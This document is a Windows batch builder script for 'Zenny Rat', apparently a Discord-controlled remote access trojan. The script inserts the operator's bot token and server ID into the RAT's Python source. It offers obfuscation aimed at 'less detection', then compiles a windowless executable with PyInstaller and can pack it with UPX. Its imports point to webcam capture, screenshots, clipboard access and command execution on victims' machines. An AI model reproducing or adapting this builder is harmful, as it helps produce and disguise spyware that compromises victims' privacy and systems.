@echo off
setlocal

:main
copy Zenny.py building.py
chcp 65001
title Zenny Rat Version 0.1
mode con: cols=200
echo      ooooooooooooooooooooooooooooooooooooo
echo      8                                .d88
echo      8  oooooooooooooooooooooooooooood8888
echo      8  8888888888888888888888888P"   8888    oooooooooooooooo
echo      8  8888888888888888888888P"      8888    8              8        ╦═╗┌─┐┌┬┐┌─┐┌┬┐┌─┐  ╔═╗┌─┐┌─┐┌─┐┌─┐┌─┐  
echo      8  8888888888888888888P"         8888    8             d8        ╠╦╝├┤ ││││ │ │ ├┤   ╠═╣│  │  ├┤ └─┐└─┐    
echo      8  8888888888888888P"            8888    8            d88        ╩╚═└─┘┴ ┴└─┘ ┴ └─┘  ╩ ╩└─┘└─┘└─┘└─┘└─┘   
echo      8  8888888888888P"               8888    8           d888
echo      8  8888888888P"                  8888    8          d8888
echo      8  8888888P"                     8888    8         d88888
echo      8  8888P"                        8888    8        d888888
echo      8  8888oooooooooooooooooooooocgmm8888    8       d8888888
echo      8 .od88888888888888888888888888888888    8      d88888888               ╔═╗╔═╗╔╗╔╔╗╔╦ ╦  ╦═╗╔═╗╔╦╗
echo      8888888888888888888888888888888888888    8     d888888888               ╔═╝║╣ ║║║║║║╚╦╝  ╠╦╝╠═╣ ║ 
echo                                               8    d8888888888               ╚═╝╚═╝╝╚╝╝╚╝ ╩   ╩╚═╩ ╩ ╩ 
echo         ooooooooooooooooooooooooooooooo       8   d88888888888
echo        d                       ...oood8b      8  d888888888888
echo       d              ...oood888888888888b     8 d8888888888888
echo      d     ...oood88888888888888888888888b    8d88888888888888
echo     dood8888888888888888888888888888888888b
echo.
set /p bottoken="Enter Bot Token: "
powershell -Command "(Get-Content building.py) -replace '%%token%%', '%bottoken%' | Set-Content building.py"
set /p serverid="Enter Server ID: "
powershell -Command "(Get-Content building.py) -replace '%%id%%', '%serverid%' | Set-Content building.py"
echo.
echo Obfuscation: Obfuscates file and gives less detection also less chance
echo they are going to get the bot token
echo.
echo Non Obfuscated Just compiles with Pyinstaller
echo.
echo upx option: builds with pyinstaller doesnt obf but packs with upx
set /p obf="Do you want to Obfuscate your file? (y/n/upx): "
if "%obf%"=="y" goto obf
if "%obf%"=="n" goto non
if "%obf%"=="upx" goto upx

:obf
py obf.py -o output.py building.py

pyinstaller --onefile --noconsole --hidden-import=os --hidden-import=cv2 --hidden-import=discord --hidden-import=asyncio --hidden-import=ctypes --hidden-import=psutil --hidden-import=requests --hidden-import=datetime --hidden-import=platform --hidden-import=numpy --hidden-import=subprocess --hidden-import=webbrowser --hidden-import=pyautogui --hidden-import=socket --hidden-import=pyperclip --hidden-import=pygame --hidden-import=PIL --hidden-import=ImageGrab --hidden-import=io --hidden-import=discord --hidden-import=File --hidden-import=commands output.py -n Built
pause
goto main

:non

pyinstaller --onefile --noconsole --hidden-import=os --hidden-import=cv2 --hidden-import=discord --hidden-import=asyncio --hidden-import=ctypes --hidden-import=psutil --hidden-import=requests --hidden-import=datetime --hidden-import=platform --hidden-import=numpy --hidden-import=subprocess --hidden-import=webbrowser --hidden-import=pyautogui --hidden-import=socket --hidden-import=pyperclip --hidden-import=pygame --hidden-import=PIL --hidden-import=ImageGrab --hidden-import=io --hidden-import=discord --hidden-import=File --hidden-import=commands building.py -n Built

:upx

pyinstaller --onefile --noconsole --hidden-import=os --hidden-import=cv2 --hidden-import=discord --hidden-import=asyncio --hidden-import=ctypes --hidden-import=psutil --hidden-import=requests --hidden-import=datetime --hidden-import=platform --hidden-import=numpy --hidden-import=subprocess --hidden-import=webbrowser --hidden-import=pyautogui --hidden-import=socket --hidden-import=pyperclip --hidden-import=pygame --hidden-import=PIL --hidden-import=ImageGrab --hidden-import=io --hidden-import=discord --hidden-import=File --hidden-import=commands building.py -n Built
upx --best --force dist/Built.exe
pause
goto main

echo Script built successfully.

endlocal
